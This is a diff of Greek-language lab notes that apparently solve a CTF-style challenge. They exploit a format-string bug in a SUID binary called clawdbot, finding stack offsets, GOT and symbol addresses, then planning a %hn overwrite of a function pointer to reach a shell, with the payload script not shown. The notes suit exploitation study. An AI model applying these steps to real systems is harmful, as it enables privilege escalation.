@@ -1,13 +1,58 @@
-1) docker run --rm --privileged -it ethan42/clawdbot:latest bash 
-    (κατεβάζω το container)
-2) gcc clawdbot.c -o clawdbot
-    (για να κατασκεβάσω το binary)
-3)checksec --file=clawdbot
-    (ελέγχω προστασία στο binary)
-4) cat clawdbot.c
-5) grep -n printf clawdbot.c --> 208 και 209 γραμμή 
-6) grep -n argv clawdbot.c --> 208 γραμμή
-7) grep -n main clawdbot.c --> 195 γραμμή είσοδο με argc, argv
-8) %p για να μας εκτυπώσει pointer από την στοίβα για να δούμε που ξεκινάει το format string
-9) ./clawdbot "AAAA %p %p %p %p %p %p %p %p %p"
-    (εκτελώ το binary με το format string για να δω που είναι το pointer)
+-------------------Βοηθητικό αρχείο----------------------
+
+1) docker run --rm --privileged -it ethan42/clawdbot:latest bash  
+   (κατεβάζω το container)
+
+2) which clawdbot → /usr/sbin/clawdbot  
+    (που βρίσκεται το binary)
+
+3) ls -la /usr/sbin/clawdbot  (έχει SUID)
+
+3) checksec --file=/usr/sbin/clawdbot 
+   (ελέγχω προστασία στο binary → Partial RELRO, No canary, NX disabled, No PIE)
+   (Relocation Read Only = Global Offset Table (GOT), Canary = προστασία από buffer overflow, NX = Non-Executable Stack, PIE = Position Independent Executable )
+   ( GOT overwrite attacks-> printf, Το binary φορτώνεται στην ίδια διεύθυνση κάθε φορά )
+
+4) cat -n clawdbot.c
+
+5) grep -n printf clawdbot.c → γραμμές 208 και 209
+
+6) grep -n argv clawdbot.c → γραμμή 208
+
+7) grep -n main clawdbot.c → γραμμή 195, είσοδος με argc, argv
+
+8) 189  void all_your_base_are_belong_to_us() {
+   190      execl("/bin/sh", "sh", NULL);
+   191  }
+
+8) χρησιμοποιώ %p για να εκτυπωθούν pointers από τη στοίβα και να δω πού ξεκινά το format string
+
+9) /usr/sbin/clawdbot "AAAA %p %p %p %p %p %p %p %p %p"  
+   (το 0x41414141 εμφανίζεται στη 4η θέση → το buffer μας είναι στο stack offset 4)
+
+10) /usr/sbin/clawdbot "AAAA %4$p" → εκτυπώνει AAAA %4!  (ΔΕΝ ΒΟΗΘΗΣΕ)
+
+11) objdump -R /usr/sbin/clawdbot  
+    (οι GOT εγγραφές ξεκινούν από 0804dfec → σταθερές διευθύνσεις παρά το ASLR)
+    (για να βρώ εξωτερικές συναρτήσεις)
+    ....              (relocation table για dynamic functions)
+    0804e02c R_386_JUMP_SLOT   putchar@GLIBC_2.0
+    0804e030 R_386_JUMP_SLOT   execl@GLIBC_2.0
+    0804e034 R_386_JUMP_SLOT   sprintf@GLIBC_2.0
+    ...
+
+25) nm /usr/sbin/clawdbot | grep -E "all_your|process"
+    ....
+    08049c6d T all_your_base_are_belong_to_us
+    0804e044 D process
+    ...
+    (βρίσκω την all_your_base_are_belong_to_us που καλεί execl("/bin/sh") και τον global function pointer process)
+
+26) overwrite του process pointer (0x0804e044) → all_your_base_are_belong_to_us (0x08049c6d) 
+    *(0x0804e044) = 0x08049c6d
+    με two-short-write %hn: hi=0x0804, lo=0x9c6d 
+
+27) docker run --rm --privileged -v `pwd`/exploit.py:/exploit.py -it ethan42/clawdbot:latest bash
+
+28) python3 /exploit.py > /tmp/payload
+    clawdbot `cat /tmp/payload`
